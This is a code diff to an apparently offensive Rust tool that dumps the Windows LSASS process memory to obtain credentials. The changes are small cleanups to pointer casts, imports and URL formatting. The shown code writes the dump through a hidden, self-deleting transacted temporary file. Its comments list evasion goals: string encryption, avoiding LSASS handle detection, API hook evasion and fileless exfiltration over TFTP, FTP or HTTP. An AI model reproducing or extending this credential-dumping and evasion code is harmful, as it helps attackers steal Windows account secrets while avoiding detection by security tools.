@@ -56,11 +56,11 @@
 //! * Use litcrypt2 or similar to encrypt strings locally
 //! * Allow to manually specify LSASS pid to avoid noisy process scans
 //! * Avoid directly opening LSASS handle (e.g., via PssCaptureSnapshot)
-//! * Use https://github.com/Kudaes/DInvoke_rs or similar for API hooks evasion
-//! * https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
+//! * Use <https://github.com/Kudaes/DInvoke_rs> or similar for API hooks evasion
+//! * <https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html>
 //! * Implement fileless exfiltration channels (e.g., TFTP, FTP, HTTP...)
 //! * Consider dumping to memory using minidump callbacks instead of TxF API
-//! * https://adepts.of0x.cc/hookson-hootoff/
+//! * <https://adepts.of0x.cc/hookson-hootoff/>
 //! * Consider better command line handling if minimal is not enough
 //!
 
@@ -76,7 +76,7 @@ use rand::prelude::*;
 
 use sysinfo::System;
 
-use windows::core::{PCWSTR, PCSTR};
+use windows::core::{PCSTR, PCWSTR};
 use windows::Win32::Foundation::CloseHandle;
 use windows::Win32::Storage::FileSystem::*;
 use windows::Win32::System::Diagnostics::Debug::*;
@@ -128,8 +128,8 @@ fn dump() -> Result<(), Box<dyn Error>> {
     };
 
     // Create intermediate output file as a transacted operation
-    let filename = format!(".\\{rand}.log", rand = rand_str(8));
-    let file_ptr = filename.as_ptr() as *mut u8;
+    let mut filename = format!(".\\{rand}.log", rand = rand_str(8));
+    let file_ptr = filename.as_mut_ptr();
     let file_handle = unsafe {
         CreateFileTransactedA(
             PCSTR(file_ptr),
@@ -140,7 +140,7 @@ fn dump() -> Result<(), Box<dyn Error>> {
             FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
             None,
             txf_handle,
-            Some(std::mem::transmute(&TXFS_MINIVERSION_DIRTY_VIEW)),
+            Some(&TXFS_MINIVERSION_DIRTY_VIEW as *const TXFS_MINIVERSION),
             None,
         )?
     };
@@ -155,7 +155,7 @@ fn dump() -> Result<(), Box<dyn Error>> {
             None,
             None,
             None,
-        )?
+        )?;
     };
     println!("[+] Dump successful!");
 
